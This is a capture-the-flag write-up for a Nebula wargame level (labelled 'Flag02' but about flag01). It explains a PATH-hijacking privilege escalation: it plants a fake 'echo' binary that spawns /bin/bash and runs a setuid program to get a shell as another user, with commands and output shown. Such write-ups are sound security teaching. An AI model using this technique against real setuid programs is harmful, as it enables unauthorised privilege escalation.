## Flag02

#### About
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```
### Solution:
Hence there is a hint about the enviroment variables, we should have a look at this

```bash
printenv

```
The program usees the system command to run other systemcalls. Additionally there is use of the echo command, which just repeats a given argument on the std out channel.
With this knowledge, we now try to break this system command. Yes, we will write our own echo command, to overwrite the existing echo command.

We aim  to get a shell as another user. To do so we have to write a simple program, that calls a shell (in this particular case the bash shell).

```c
#include<stdio.h>
#include<stdlib.h>

int main(void) {
	system("/bin/bash");
}

```

The above shown code shows how this could look like. Compile this code and ad its consisting folder to the enviroment variable (here I used /tmp, other folders would work as well. This folder is temporary, so everything gets deleted after reboot).

```bash
# cd /tmp
# cc echo.c -o echo
# PATH=/tmp/:$PATH
```

Now change back to the folder of flag01 and run the flag binary -- yes, it has set uid as well as the last one. 
```bash
level01@nebula:~$ cd /tmp/
level01@nebula:/tmp$ PATH=/tmp/:$PATH
level01@nebula:/tmp$ ./flag01 
level01@nebula:/tmp$ cd /home/flag01/
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
```